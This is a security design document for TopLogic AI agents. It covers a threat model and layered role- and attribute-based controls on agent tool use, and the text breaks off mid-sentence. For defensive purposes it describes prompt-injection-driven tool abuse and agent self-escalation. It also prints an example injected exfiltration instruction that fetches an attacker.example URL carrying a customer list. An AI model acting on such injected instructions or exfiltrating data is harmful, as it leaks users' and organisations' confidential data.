# Security Architecture for TopLogic AI Agents

**Status:** design, with **layer L1 (tool RBAC, sections 3.2 and 4.1) implemented** and every other
layer still staged. Enforcement is opt-in per application: an application that has written no
`<tool-access>` policy stays on mode `LEGACY` and behaves exactly as it did before. Section 6 is the
per-artifact map; [tool-access-configuration.md](tool-access-configuration.md) is the administrator's
guide to the part that works; [testbed.md](testbed.md) is the runnable fixture that shows it, one
persona and one expected result per behaviour.
**Depends on:** engine ticket **#29088** (`ModelAccessRights` / `SecurityConfigurationService`),
**released** in engine `8.0.0-alpha7`, which tl-ai now builds against. All API references below are
verified against that released artifact.
**Companion spec:** `specs/model-based-access-rights.md` in tl-engine-7 (the model-security design this
document builds on).
**Language:** English, to stay consistent with the engine spec and with the Javadoc of the classes
discussed here (`doc/architecture.md` is a German stakeholder overview and serves a different audience).

---

## 0. Executive summary

When a user asks a tl-ai agent for help, the agent must act **as that user** - it may use only the
tools the user's role permits, read and write only the data the user may, and must never place
forbidden data into the conversation. Today the agent runs effectively unrestricted: the tool
permission hook is hardcoded to `true`, the data-access hooks have no callers, and every Java tool
that touches the `KnowledgeBase` does so without a security check.

This document specifies:

1. A **threat model** for agent execution (section 2).
2. A **layered enforcement architecture** (section 3): execution mode -> tool RBAC -> model ABAC ->
   result pre-filtering -> pre-commit action guard -> reference guard -> audit.
3. The **admin-facing configuration** for the role-to-tool mapping the product needs (section 4),
   including config XML, tool groups and an administration-UI concept.
4. A **rollout plan** that keeps existing applications working (section 5).
5. What is **built** and what is reference code only (section 6).

The two central design commitments:

- **Deny by default, everywhere.** A tool with no grant is not offered and not executable. A model
  type with no `<security-config>` grant is not readable. Both engine and agent layer already behave
  this way; this design does not soften it, it only makes the transition survivable (section 5).
- **Two independent authorizations per tool call.** A call is permitted only if
  *(a)* the user's roles grant the **tool** (RBAC, section 3.2) **and**
  *(b)* every model object the tool touches passes the **model check** (ABAC, section 3.3).
  Neither substitutes for the other: `executeTLScript` is one tool but can touch any type, and
  `listInstances` is READ-classified but can enumerate a payroll table.

---

## 1. Where we are today (verified against the code)

| Concern | Current state | Evidence |
|---|---|---|
| Tool permission | **Enforced under a configured policy** (was hardcoded `true`) | `TopLogicSecurityContext.hasToolPermission` answers from `ToolAuthorization`; `true` throughout while no `<tool-access>` is configured |
| Tool permission by name | Same | `SecurityContext.hasToolPermission(String)` still defaults to `true` for implementations that do not override it |
| Data read/write check | Dead stubs, `Object`-typed, **no callers** | `SecurityContext.java:67`, `:80`; a repo-wide grep finds only the declarations |
| Execution-mode gate | Live | `ToolPermissionFilter.java:36-45` denies `STRUCTURAL` in `PRODUCTION` |
| Approval gate | Live | `SecurityContext.checkApproval` -> `AgentLoop.java:933`; `USER_SCOPED`/`DATA_WRITE`/`STRUCTURAL` need approval |
| Schema filter hook | Live but no-op | `AgentLoop.java:1143` builds the provider tool list through `ToolPermissionFilter` |
| Invocation gate hook | Live but no-op | `AgentLoop.java:885-919` (`executeWithSecurityCheck`) |
| Chat identity | Correct | `ChatProcessor.buildToolContext` (`ChatProcessor.java:460-499`) installs `TopLogicSecurityContext`; tools run inside the chat user's sub-session |
| Async agent identity | Correct | `AIScriptFunctions.agentChatAsync` (`:422-436`) refuses to start without a `Person`; the background run re-enters the caller's sub-session (`:448`, `:471`) |
| TL-Script entry points | **Unrestricted** | `ToolContext.createUnrestricted()` at `AIScriptFunctions.java:183` (`ai.callTool`), `:289` (`ai.chat`), `:343` (`ai.agentChat`) |
| Test/EMPTY context | **Unrestricted, reachable from production code** | `ToolContext.EMPTY` (`ToolContext.java:31`) is used by `AgentFactory.java:119` and `AgentLoop.java:347` |
| MCP server | **Still unauthenticated; no longer context-free** | `tl-ai-mcp-server/src/main/resources/META-INF/web-fragment.xml` maps `/mcp/*` with no `security-constraint`, and `tl-ai-demo/.../web.xml` has every filter commented out, so there is no caller identity to resolve (**#261**). `McpToolAdapter` no longer passes a `null` context: it builds an unattended, principal-less `ToolContext` (`McpToolContexts`) and, under `ENFORCED`, **refuses** the call instead of running it as the system. A `LEGACY` deployment is unchanged, i.e. still fully exposed on that endpoint - `MCPServerService` says so at every boot |
| Java data tools | **No checks** | e.g. `InstanceBrowserTool.doListInstances` calls `MetaElementUtil.getAllInstancesOf(type, TLObject.class)` and paginates the raw result (`InstanceBrowserTool.java:158`) |
| Model digest | Unfiltered | `ModelDigestGenerator.generate` walks all modules of the application model (`ModelDigestGenerator.java:46-51`) and is injected into the system prompt |

Two engine behaviours matter for the design and are verified against released `8.0.0-alpha7`:

- **`ThreadContext.isSystemContext()` fully bypasses model security.**
  `SecurityConfigurationService.isAllowedBypass` returns `TRUE` for a system context, and
  `BoundChecker.isAllowedBypass` returns `TRUE` for `ThreadContext.isAdmin()` and `FALSE` for a
  `null` user. This is the right semantics, but it means *how tl-ai establishes its thread context
  decides whether any model security applies at all*.
- **`ToolExecutions.execute` wraps every tool call in `ThreadContextManager.inSystemInteraction(...)`**
  (`ToolExecutions.java:48`). That call **reuses an existing interaction** and only creates a system
  interaction when none is bound. So the chat path keeps the user's identity (good), while the MCP
  path and context-less background paths get a system interaction (full bypass). The behaviour is
  correct-by-accident today and must become **explicit** (section 3.1).

---

## 2. Threat model and objectives

### 2.1 Assets

| # | Asset | Why it matters |
|---|---|---|
| A1 | Business data in the `KnowledgeBase` | The primary confidentiality and integrity asset |
| A2 | Application model and configuration | Structural change is a privilege-escalation primitive: a new type, a changed annotation or a rewired agent changes everyone's security posture |
| A3 | Agent/skill/tool definitions | An agent's system prompt, tool set and delegation edges are security policy in disguise |
| A4 | Conversation transcripts | Persisted per `AgentSession`; contain whatever the agent read |
| A5 | Provider credentials and outbound network access | `webFetch`, MCP stdio servers, Gitea integration |
| A6 | The LLM context window | Everything placed in it is disclosed to the model provider and, via the transcript, to whoever can read the session |

### 2.2 Actors and trust boundaries

```
 ┌──────────────┐        ┌───────────────────────────────────┐
 │ Chat user    │──HTTP─▶│ tl-chat  (authenticated)          │
 │ (Person)     │        │  ChatProcessor.buildToolContext   │
 └──────────────┘        └───────────────┬───────────────────┘
                                         │  ToolContext(security, approval, tx)
 ┌──────────────┐        ┌───────────────▼───────────────────┐
 │ External MCP │──HTTP─▶│ MCPTransportServlet  /mcp/*       │──▶ refused under ENFORCED (no principal)
 │ client       │        │  (no auth filter today, #261)     │
 └──────────────┘        └───────────────────────────────────┘
                                         │
 ┌──────────────┐        ┌───────────────▼───────────────────┐        ┌──────────────┐
 │ Scheduler /  │───────▶│ AIScriptFunctions.agentChatAsync  │───────▶│  AgentLoop   │
 │ TL-Script    │        │  (Person required)                │        │  ToolCatalog │
 └──────────────┘        │ AIScriptFunctions.callTool/chat   │        └──────┬───────┘
                         │  (createUnrestricted)             │               │
                         └───────────────────────────────────┘               ▼
                                                                    ┌──────────────────┐
    ══════ trust boundary ══════════════════════════════════════════│ KnowledgeBase /  │
    Untrusted input crosses here: user prompts, tool RESULTS,        │ TLModel / files  │
    MCP tool descriptions, fetched web pages, RAG chunks.            └──────────────────┘
```

The decisive property: **everything that enters the context window is untrusted input, including
tool results.** The LLM is not a security boundary and must never be relied on to enforce policy.
All gates in this design are deterministic Java checks on the call path, never prompt instructions.

### 2.3 Threats

| # | Threat | Realised today? | Addressed by |
|---|---|---|---|
| **T1** | **Agent over-privilege.** The agent can invoke any tool in its catalog regardless of who is chatting; a read-only clerk can drive `ModelEditorTool`. | **Addressed** where an application configures `<tool-access>`; otherwise yes | L1 (3.2), built |
| **T2** | **Data over-read.** `listInstances`/`getInstance`/`searchModel` return objects the user may not see; the answer, the transcript and the SSE stream all carry them. | Yes | L2 (3.3), L3 (3.4) |
| **T3** | **Prompt-injection-driven tool abuse.** A malicious value stored in a business object, an MCP tool description, or a fetched web page instructs the agent to call a write tool or exfiltrate data. | Yes | L1+L2+L4; approval for write modes; *not* mitigated by prompting |
| **T4** | **Exfiltration via an outbound tool.** The agent is induced to put secret data into a `webFetch` URL, a Gitea issue body, or an MCP call to an external server. | Yes | L2 on the read side (it never gets the data), plus egress classification (3.2.4) |
| **T5** | **Unattended/background over-privilege.** `agentChatAsync` runs with `ApprovalCallback.AUTO_APPROVE` (`AIScriptFunctions.java:471-472`): every approval-gated tool self-approves. | Yes - by design, but unbounded | 3.1 (mode), 3.2.5 (background tool floor) |
| **T6** | **The unrestricted bypasses.** `ToolContext.createUnrestricted()` and `ToolContext.EMPTY` grant `SecurityContext.UNRESTRICTED` + `AUTO_APPROVE` + `DEVELOPMENT` mode. `EMPTY` is reachable from `AgentFactory.runAgent` and `AgentLoop.run`. | Yes | 3.1 |
| **T7** | **The MCP bypass.** `/mcp/*` is unauthenticated. Every adapted tool used to execute with a `null` `ToolContext` in a system interaction - i.e. with the engine's super-user bypass. | Only under `LEGACY`: an `ENFORCED` deployment now refuses MCP tool execution, because an unauthenticated caller cannot be authorized | 3.1, 3.7, **#261** for the transport half |
| **T8** | **Privilege escalation via self-modification.** `AgentAuthoringTool`, `FrameworkWiringTool`, `ScriptToolAuthoringTool` let an agent create agents, add tools to agents and define new script tools. An agent that may edit agents can grant itself any tool. | Yes | 3.2.3 (privileged group), 3.2.6 (delegation cannot widen) |
| **T9** | **Privilege escalation via self-selected security level.** Nothing stops a caller from constructing a permissive `SecurityContext` or picking a laxer mode. | Yes | 3.1 (the mode is static application configuration, resolved once per run, immutable) |
| **T10** | **RAG / vector-index leakage.** `searchVectorIndex` returns chunks derived from indexed objects with no per-user filter; the index is built by a background daemon under system rights. | Yes | 3.4.3 |
| **T11** | **Schema disclosure.** The model digest injected into the system prompt enumerates every module, type and attribute of the application. | Yes | 3.4.2 |
| **T12** | **Write without authority reaching the commit.** Any tool that forgot its check (or a future/MCP tool that never had one) writes through the shared `TransactionScope`, and the end-of-turn commit persists it. **Closed for an enforcing run** by 3.5. | Yes | 3.5 (pre-commit guard) · **implemented** |
| **T13** | **Cross-session/transcript disclosure.** Session transcripts persist whatever the agent read; a later reader of the session sees data they may no longer be entitled to. | Partially | Out of scope here, see 2.5 |

### 2.4 Objectives

- **O1 - Act as the user.** Every agent run has exactly one authenticated `Person`, resolved once and
  immutable for the run. No `Person`, no run (in `ENFORCED`).
- **O2 - Least privilege on tools.** A user may invoke a tool only if a role they hold is granted that
  tool. Unknown/new tools default to denied.
- **O3 - Least privilege on data.** Every model access performed on the user's behalf is checked with
  `ModelAccessRights` against that `Person`.
- **O4 - Deny by default.** Absence of configuration denies. This holds independently at the tool
  layer and at the model layer.
- **O5 - Defense in depth.** Filtering the tool list is a UX affordance, never the enforcement point;
  every layer re-checks. A tool that skips its own check is still caught before commit.
- **O6 - Separation of duties.** Who may *use* an agent, who may *define* agents/tools, and who may
  *write the security policy* are three different privileges.
- **O7 - Auditability.** Every denial, every bypass, and every rolled-back write is logged with run,
  turn, user, tool and reason.
- **O8 - Explainability.** A denial produces a reason the model can act on ("you lack role X") and an
  operator can trace, without disclosing the content that was withheld.

### 2.5 Non-goals

- **Not a defense against a malicious model provider.** Data that legitimately reaches the context
  window is disclosed to the provider by construction.
- **Not "scan the answer for secrets".** By the time text is emitted it has already been streamed
  over SSE. Post-hoc redaction of free text is theatre; we pre-filter instead (section 3.4). The one
  deterministic output check we do keep is the *reference* guard (section 3.6).
- **Not prompt-injection immunity.** We reduce the blast radius (an injected instruction can only do
  what the user could do) rather than claiming to detect injection.
- **Not retroactive transcript re-authorization (T13).** Making historic transcripts re-evaluate
  today's permissions is a separate ticket; the mitigation here is that less gets into them.
- **Not the model-security policy itself.** *Which* roles may read *which* types is the application's
  `<security-config>` (#29088). This document defines how tl-ai *consumes* it.
- **Not transport authentication for `/mcp/*`.** Section 3.7 states the requirement; implementing the
  authentication filter is engine/app work, tracked as **issue #261**. What *is* done here is the
  half that does not need it: the endpoint no longer executes tools with no security context, and an
  `ENFORCED` deployment refuses MCP tool calls outright rather than running them as the system. Until
  #261 lands, MCP tool execution and enforcement are mutually exclusive.

---

## 3. The layered architecture

```
                       ┌─────────────────────────────────────────────┐
   run starts  ───────▶│ L0  Identity + AiSecurityMode               │  once per run
                       │     Person required; mode from the policy   │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   build request ─────▶│ L1a Tool RBAC - schema filter (UX)          │  every turn
                       │     ToolPermissionFilter @ AgentLoop:1143   │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   tool call  ────────▶│ L1b Tool RBAC - invocation gate (SAFETY)    │  every call
                       │     executeWithSecurityCheck @ AgentLoop:885│
                       │     + ExecutionMode gate + approval         │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   inside the tool ───▶│ L2  Model ABAC via ModelAccessRights        │  every object
                       │     ctx.modelSecurity().canRead/Write/Create│
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   before serialize ──▶│ L3  Result pre-filter                       │  every result
                       │     filterSecurity + digest + RAG filter    │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   end of turn  ──────▶│ L4  Pre-commit action guard                 │  every commit
                       │     PreCommitGuard @ commitTransaction      │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   emit answer  ──────▶│ L5  Reference guard (links/ids only)        │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
                       │ L6  Audit log (denials, bypasses, rollbacks)│
                       └─────────────────────────────────────────────┘
```

Layers are **independent**: L1 does not assume L2 ran, L4 does not assume L2 ran. That is the point -
L4 exists precisely because some tool will forget L2.

### 3.1 L0 - Execution mode and identity

#### `AiSecurityMode`

```java
public enum AiSecurityMode {
    /** Full enforcement: a Person is required, tool RBAC and model checks apply. */
    ENFORCED,
    /** Audited bypass for trusted system automation. Every use is logged. */
    SYSTEM,
    /** The default: no tool RBAC, no model checks. Migration only. */
    LEGACY
}
```

`SYSTEM` is *not* "no security" - it is "the system is the principal, and we say so out loud". Every
`SYSTEM`-mode run emits an audit record naming the configured reason (section 3.8). It is the honest
name for what `createUnrestricted()` does silently today.

#### Resolution: the deployment ceiling and the agent's floor

```
effectiveMode = stricter(deploymentCeiling, agentFloor)     where an absent policy means LEGACY
                                                           and an absent floor means "no floor"
```

The ceiling is service configuration (`AiToolAccessService`), set by whoever operates the application,
and every run of that application carries at least it. The floor is the optional `security-mode` of
one agent definition, and the ordering `ENFORCED > SYSTEM > LEGACY` decides between them:
`AiSecurityMode.resolve(ToolAccessPolicy, AiSecurityMode)` is the whole rule.

Reading the per-agent value as a **floor** rather than as an override is what makes it safe to expose
at all. Authoring an agent is a privileged action, but it is a *different* privilege from operating
the deployment - so an agent may demand `ENFORCED` in a `LEGACY` deployment, and an agent asking for
`LEGACY` in an `ENFORCED` deployment gets nothing. There is no escalation direction to abuse. The one
uncomfortable corner is that the laxer value is then silently inert; it is stated in the property's
own tooltip rather than left to be discovered.

Threat **T9** is escalation by self-selection, and the answer is that neither input comes from the
run: the ceiling is static application configuration and the floor is the agent definition, not
anything the caller or the model supplies. Resolution happens **once** - the entry point resolves it
when it builds the `ToolContext`, and `AgentLoop` resolves it again for the agent it is about to run,
before the first provider call - and the result is a final field on the `SecurityContext`. It is never
re-derived mid-run and never re-derived per tool call, so a tool cannot influence it.

**Why twice.** The loop is the point every run passes through, including a delegated child and an
asynchronous subagent, so applying the floor there is what gives child runs the rule below without
each entry point knowing about it. But tightening needs the run's principal, and the fallback context
a TL-Script entry point uses while nothing is enforced has none - so an entry point that ignored the
floor would leave the loop able only to *refuse* the run. Both applications are idempotent
(`SecurityContext.restrictedTo` returns `this` unless the floor really tightens), so resolving twice
is not resolving differently.

**Delegation and subagents.** A child run inherits its parent's `SecurityContext` unchanged and its
own loop can only narrow it. So a child is **never laxer than its parent's effective mode**, whatever
the child agent declares, and a child agent declaring something stricter keeps it. Nothing special is
needed at the delegation seam; the invariant follows from the composition being one-directional.

**What an `ENFORCED` floor actually buys** depends on what the deployment has to enforce with. Model
access is the engine's, so it applies immediately. Tool authorization is the policy's, and a
deployment that configured no `AiToolAccessService` at all has no matrix to check against - the run
then carries `ENFORCED` with `ToolAuthorization.UNCHECKED`. A floor raises the mode; it does not
invent a policy.

Defaults:

| Deployment | Default ceiling | Rationale |
|---|---|---|
| New application (no `<security-config>` present at boot, `tl-ai` first installed) | `ENFORCED` | Safe by default |
| Existing application with no `<security-config>` | `LEGACY` + a boot warning | Deny-by-default model security would otherwise make every agent useless overnight (section 5) |
| Any application that has a non-empty `<security-config>` | `ENFORCED` | Presence of a policy is the opt-in signal |

The "existing application" case is detected at boot: `SecurityConfigurationService` has an empty
`getSecurityConfig()` **and** the application did not explicitly configure a mode. That combination
logs one prominent warning per boot and selects `LEGACY`. Explicit configuration always wins over the
heuristic.

#### Identity

In `ENFORCED`, the run is refused **up front** - before the first provider call, not at the first
tool call - if `TLContext.currentUser()` is `null`. The reason: a run without a principal cannot be
authorized, and failing at the first tool call wastes a provider round trip and produces a confusing
half-run. `AIScriptFunctions.agentChatAsync` already does exactly this (`:426-436`); the check moves
into the shared entry point so all four entry points inherit it.

The resolved `Person` is captured on the `SecurityContext` at construction. It is **not** re-read from
`TLContext` per check: a concurrent tool batch runs on worker threads that re-establish the sub-session
(`AgentLoop.java:776-808`), and a design that re-reads thread state per check is one thread-local bug
away from checking the wrong user.

#### Making the bypasses loud

| Today | Becomes | Behaviour |
|---|---|---|
| `ToolContext.EMPTY` | `ToolContext.forTesting()` | Package-visible where possible; asserts it is not used in a deployed environment |
| `ToolContext.createUnrestricted()` | `ToolContext.createSystemContext(String auditReason)` | Mandatory non-blank reason; emits an audit record on creation; resolves to `AiSecurityMode.SYSTEM`, which is subject to the global ceiling |
| `SecurityContext.UNRESTRICTED` | `SecurityContext.systemContext(String reason)` | Same |

`AgentFactory.java:119` and `AgentLoop.java:347`, which currently reach for `ToolContext.EMPTY` from
production code paths, are re-pointed at an explicit system context with a stated reason.

The three `AIScriptFunctions` call sites are re-pointed as follows:

| Call site | Today | Target |
|---|---|---|
| `ai.callTool` (`:183`) | `createUnrestricted()` | Caller's context when a `Person` is bound; otherwise `SYSTEM` with reason `"ai.callTool from a context-less caller"` |
| `ai.chat` (`:289`) | `createUnrestricted()` | Same |
| `ai.agentChat` (`:343`) | `createUnrestricted()` | Same |

Note this is a *behaviour* change for TL-Script users: `aiCallTool` invoked from an interactive
Script Console session currently runs unrestricted and will then run as the console user. That is the
correct semantics and is called out in the rollout plan (section 5).

### 3.2 L1 - Tool authorization (role-based) · **implemented**

This is the capability the product needs: **an administrator decides which security roles may use
which tools.** Built as described below, minus the administration UI of section 4.3; see section 6 for
the artifact-by-artifact status and [tool-access-configuration.md](tool-access-configuration.md) for the
administrator's view.

#### 3.2.1 The decision

```
allowTool(person, tool, agent) :=
        roleGrantsTool(person, tool)                  // RBAC, section 3.2.2
   AND  agent.tools contains tool                     // per-agent grant, existing
   AND  executionModeAllows(tool.mode())              // existing, ToolPermissionFilter:40
```

**Both** the role grant and the per-agent grant must allow. They answer different questions:

- The **agent's tool list** is a *capability scope*: "this assistant is about invoices, so it has the
  invoice tools." It is authored by an application developer, versioned with the agent.
- The **role grant** is an *authorization*: "clerks may not restructure the model." It is authored by
  a security administrator, and it is the one that must hold even when someone edits an agent (T8).

An agent may therefore never widen a user's rights, which is what makes agent authoring a
capability-management action rather than a privilege-granting one.

#### 3.2.2 `roleGrantsTool`

```
roleGrantsTool(person, tool) :=
     person.isAdmin()                                      // engine super-user, mirrors BoundChecker
  OR ( exists role r in rolesOf(person, securityRoot) :
         policy.grants(r, tool)  AND  NOT policy.denies(r, tool) )
```

- **Roles are read on the security root.** Tool access is a global capability ("may this person use
  the model editor at all"), not an instance-scoped one; per-instance nuance belongs to L2. Reading
  roles on `BoundHelper.getInstance().getDefaultObject()` matches how `ModelAccessRights` treats
  top-level CREATE (spec 2.3.6).
- **Grants are additive across the user's roles, denies win.** Union of the grants of all held roles,
  minus anything explicitly denied by any held role. An explicit `<deny>` is a hard stop - it exists so
  an administrator can carve `STRUCTURAL` out of an otherwise broad grant without re-enumerating.
- **No grant means denied.** Consistent with O4 and with the engine (`getAccessibleTypes` skips types
  with an empty role set: "Deny-by-default: a type without a grant for the command group is never
  accessible.").
- **Admin bypass mirrors the engine.** `person.isAdmin()` already bypasses `ModelAccessRights`
  (`AccessManager.hasRole:122`); having the tool layer disagree would produce an unexplainable
  half-denial.

#### 3.2.3 Tool groups

Thirty-plus tools cannot be administered one by one. Every tool belongs to exactly one **primary
group**; groups are the unit of granting.

| Group | Contents (verified from the current registry) | Default |
|---|---|---|
| `model.read` | `listModules`, `listTypes`, `listTypeParts`, `listClassifiers`, `outlineModel`, `describeAnnotation`, `getCurrentAnnotations`, `listAvailableAnnotations`, `findTypeUsages`, `findPartUsages`, `getConfigSchema`, `listLayoutTemplates`, `getLayout`, `getTopLevelLayoutKey` | grantable |
| `data.read` | `listInstances`, `getInstance`, `searchModel`, `searchVectorIndex`, `checkLock` | grantable |
| `data.write` | (currently only `executeTLScript` with `withCommit=true`, checked inside the tool; future typed instance-write tools) | grantable, approval |
| `script` | `validateTLScript`, `executeTLScript`, `listTLScriptFunctions`, `getTLScriptFunctionDocumentation` | **privileged**, read-only - the commit path additionally costs `data.write` |
| `model.structure` | `createModule`, `updateModule`, `createClass`, `updateClass`, `createProperty`, `updateProperty`, `createReference`, `createBackwardReference`, `createEnumeration`, `updateEnumeration`, `deleteModelElement`, `addAnnotation`, `removeAnnotation`, `createLayout` | **privileged** |
| `agent.authoring` | `createAgent`, `updateAgent`, `deleteAgent`, `createSkill`, `updateSkill`, `deleteSkill`, `createScriptTool`, `updateScriptTool`, `deleteScriptTool`, `addToolToAgent`, `removeToolFromAgent`, `addSkillToAgent`, `removeSkillFromAgent`, `addDelegationToAgent`, `removeDelegationFromAgent`, `addToolToSkill`, `removeToolFromSkill` | **privileged** |
| `agent.meta` | `listAgents`, `getAgent`, `listSkills`, `getSkill`, `listScriptTools`, `getScriptTool`, `listAvailableTools`, `listFrameworkAgents`, `getFrameworkAgent`, `listFrameworkSkills`, `getFrameworkSkill`, `listScriptToolFactories` | grantable |
| `interaction` | `askUser`, `loadSkill`, delegation and subagent tools | granted to every agent user by the built-in baseline |
| `workspace` | `createTask`, `updateTask`, `listTasks`, `publishPage` | grantable |
| `egress` | `webFetch`, `webSearch`, `createGiteaIssue`, all `mcp__*` tools | grantable, **never** in the baseline |

**Privileged** groups are the ones whose holder can escalate their own rights: `script`,
`model.structure` and `agent.authoring`, because each is a general-purpose escalation primitive -
`executeTLScript` can express any data operation, `model.structure` can change the shape the security
policy is written against, and `agent.authoring` can rewire who gets which tools (T8). The
classification is documentary, not mechanical: no group is reached except by a `<grant>` naming it, so
there is no implicit path a privileged group would have to be excluded from. What it says is that
granting one is an audited configuration change worth arguing about first.

Note `executeTLScript` sits in a privileged group *and* is `DATA_WRITE`-classified *and* rides on the
engine's TL-Script enforcement (which #29088 already applies). Three independent reasons for it to be
safe; each one alone would be insufficient.

A fourth, and the one that makes the `data.write` row above true rather than aspirational: the group
gates the *tool*, and `withCommit=true` is what makes the call persist, so **the commit path requires
`data.write` in addition to `script`**. The gate cannot enforce that - it decides per tool, before the
arguments - so the tool asks the run's own `ToolAuthorization` for the capability, which applies the same
order (background allowlist, administrator bypass, role grants) it applies to a tool. Without it, every
holder of `script` held every write TL-Script can express, and an allowlisted `script` handed that to
unattended runs, which auto-approve.

A tool's group is declared on the tool, not in the policy file, so a new tool cannot be silently
ungrouped:

```java
@ToolMethod(
    description = "...",
    mode = ToolMode.READ,
    group = "data.read")                       // NEW - defaults to "" => ungrouped
```

An **ungrouped tool is denied to every role** except by an explicit per-tool grant naming it. That is
the deny-by-default answer to "what happens when someone adds a tool and forgets" (O4).

#### 3.2.4 Egress classification

`egress` is a group, not a mode, because `ToolMode` describes *what state the tool changes locally* and
says nothing about *where data goes*. `webFetch` is `ToolMode.READ` and is the single best exfiltration
primitive in the catalog (T4): an injected instruction that says "fetch
`https://attacker.example/?d=<the customer list>`" is a `READ` call.

Being in `egress` has two consequences beyond ordinary granting:

- Never included in the built-in baseline.
- An egress call in the same *turn* as a `data.read` call against a restricted type is recorded in the
  audit log as a correlated pair. This is detection, not prevention - prevention is L2 ensuring the
  agent never held the data.

#### 3.2.5 Background and delegated runs

- **Background runs** (`agentChatAsync`, scheduler, MCP) run with `AUTO_APPROVE` (T5). Their tool
  ceiling is the *intersection* of the user's role grants and the configured
  `<background-allowlist>`. Rationale: approval is the compensating control for
  `DATA_WRITE`/`STRUCTURAL`, and a run with nobody to ask has lost that control, so it must not reach
  those modes without an explicit administrative decision.
  There is **no default allowlist**, and no default is possible: the allowlist is the whole
  compensating control, so an absent one cannot mean "unrestricted" (which would silently undo the
  layer for any administrator who never learned the element exists) and cannot mean a framework-chosen
  set either (which would be a security decision taken on the administrator's behalf). An enforcing
  policy that declares none is therefore a **boot-time configuration error**, and the explicit opt-out
  `<background-allowlist all="true"/>` exists so that "bounded only by the user's grants" remains
  sayable - out loud.
- **Synchronously delegated sub-agents** (`DelegationTool` without an async session) inherit the
  parent's `SecurityContext` unchanged (`ToolContext.forDelegation`) and are additionally bounded by
  the child agent's own tool list. A child can therefore only ever be a *subset* of the parent's
  authority (T8): delegation is not an escalation path. The classification is carried over as it
  stands, background flag included, because a synchronous delegation completes *inside* the parent
  turn - whoever could answer an approval prompt before it started still can.
- **Detached sub-agents** (`SpawnSubagentTool`, and `DelegationTool` in a chat session) are
  **background runs**. `spawn_subagent` is fire-and-forget: it returns a handle immediately, the
  parent turn ends, and the child keeps working on a pool thread with nobody on the other end to
  answer an approval prompt - which is this section's own definition of unattended. Their ceiling is
  therefore the intersection of the acting user's grants and the `<background-allowlist>`, applied by
  `ToolContext.forDetachedSubagent`, and their loop is built from that bounded context so the child's
  prompt reports what it can actually call. What the ceiling costs the child is logged at INFO by
  `SubagentSpawner`, named by capability. The deliberate consequence: a detached child loses tools its
  parent could use. That is the point - it also lost the control that made them safe - and it is made
  legible rather than silent.

The *exposure* of delegates - which sub-agents an agent is offered at all, and which ones it may spawn -
is filtered separately and for UX reasons only; see 3.2.7.

#### 3.2.6 Where it hooks in

Exactly the two existing seams, with unchanged responsibilities:

- **`AgentLoop.java:1143`** - `ToolPermissionFilter` decides the tool schemas sent to the provider.
  This is **UX**: the model never sees a capability it cannot use, so it does not propose it and does
  not narrate a denial. It is *not* the enforcement point (a model can hallucinate a tool name; a
  cached conversation can replay an older tool set).
- **`AgentLoop.java:885-919`** - `executeWithSecurityCheck` is the **enforcement point**. Every call
  passes here, including tools injected mid-run by a skill through `DynamicToolCatalog`. A name the
  run's registry does *not* resolve is deliberately **not** run through the permission check: such a
  name has no group, so the check would answer every hallucinated or misspelled name with "belongs to
  no tool group ... denied to everyone" and take away the `Available:` hint the model corrects itself
  with. Nothing is lost by not asking - an unresolvable name cannot execute either way, and the
  catalog refuses it with `Unknown tool: 'x'. Available: [...]`, the list holding exactly the tools
  the principal may call.

`ToolPermissionFilter.denialReason` (`:55-66`) already produces the LLM-facing message; the RBAC
denial adds one line naming the missing capability without naming the data:

> `Permission denied: tool 'model-editor.createClass' requires the 'model.structure' capability, which none of your roles grants.`

#### 3.2.7 Telling the agent what it lacks - UX, not a control

Filtering the schemas leaves the model unable to tell "you are not permitted" from "that skill is
not loaded yet" from "that does not exist": all three look like absence, so the agent answers the
user with a vague "I can't do that" or goes hunting for a skill it may also not use.

Five code fixes and one piece of prompt text address that:

- **Skills whose every tool is denied are not offered** (`AgentFactory.injectSkills`,
  `buildDynamicSkillTool`, `buildSkillTool`, all through `AgentCapabilities.unusableReason`). A skill
  with no tools at all is pure instruction text and is kept; a partly denied skill is kept and loads
  only the permitted subset; a skill whose tool names do not resolve is kept, because a typo is not a
  denial. Every dropped skill is logged at INFO with the deciding reason - silent capability loss is
  the failure mode this must not have.
- **Delegates whose every reachable tool is denied are not offered** (#264,
  `AgentCapabilities.unusableReason(AgentDefinition)`). The recursive form of the skill rule: a
  delegate's effective tool set is its own `<tools>` **plus** every tool of every skill it declares
  **plus** its MCP servers' tools **plus**, transitively, everything its own delegates reach
  (`reachableTools`). The walk visits each agent once, so a delegation cycle (A → B → A) terminates and
  the revisit contributes nothing. Three cases keep a delegate, for the reasons they keep a skill: one
  that reaches no tool at all (a **delegation-only** agent must not fall to the vacuous "all zero of
  its tools are denied"), one that is partly reachable (below), and one whose tool names resolve
  nowhere (a typo is not a denial). Every dropped delegate is logged at INFO naming the capabilities it
  needed. `LEGACY` filters nothing - the generated `### Available Delegates` section stays
  byte-identical, pinned by `TestDelegateFilter.testLegacyCatalogIsUnchanged`.

  All **three** exposure surfaces filter, from the one judged list (`AgentFactory.delegateOffers`), so
  they cannot drift: the prompt catalog (`delegateCatalog`), the `delegate_to_*` registration in both
  catalog paths (`registerDelegationTools`, static and dynamic), and `list_agents`
  (`ListAgentsTool.execute`). Filtering only the prompt text would be cosmetic, exactly as it would
  have been for skills - the model can call a tool the prompt never mentioned. With no delegate left,
  `wait_for_subagent` is not wired in either: there is nothing to await.

  This takes nothing away from anyone. A child inherits the parent's `SecurityContext` unchanged
  (3.2.5), so a delegate whose every tool is denied could only ever have started, filtered its own
  schemas to nothing, spent a provider round trip and reported failure.

  **Partial reachability: the delegate stays, and is told to be limited.** A delegate some of whose
  tools the principal may call is still worth having - it can do that part of the job - so it is
  offered, and the catalog line under it names the capabilities it *cannot* use, in the same register
  as the capability notice below (`Limited for this user - it cannot use: ...`, each capability with its
  group description). `list_agents` says the same thing in its `cannotUse` field. The alternative -
  offering it silently - makes the parent discover the limit by sending work that comes back refused,
